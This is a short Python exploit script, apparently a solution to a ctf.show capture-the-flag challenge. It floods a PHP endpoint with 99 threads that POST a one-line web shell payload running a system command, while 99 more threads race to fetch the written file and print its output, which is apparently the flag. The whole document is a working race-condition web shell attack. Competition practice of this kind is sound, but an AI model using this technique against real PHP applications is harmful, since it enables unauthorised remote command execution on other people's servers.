#Author : by T4rn
import requests
import threading
 
url1 = 'http://2ba2f102-e334-4f61-8b2f-856ea40c4645.challenge.ctf.show:8080/?ctf=1.php'
url2 = 'http://2ba2f102-e334-4f61-8b2f-856ea40c4645.challenge.ctf.show:8080/1.php'

def write_shell():
	while True:
		url=url1
		response = requests.post(url=url,data={"show":"<?php system('tac /c*');?>"})
		if (response.status_code) == 200:
			print('[+] write success')
		else:
			print('Sorry You failed')

def read_shell():
	while True:
		url = url2
		response = requests.get(url=url)
		if(response.status_code) != 404:
			print(response.text)
		else:
			print('[-]flag not get')
if __name__ == '__main__':
	for i in range(1,100):
		threading.Thread(target=write_shell).start()

	for i in range(1,100):
		threading.Thread(target=read_shell).start()

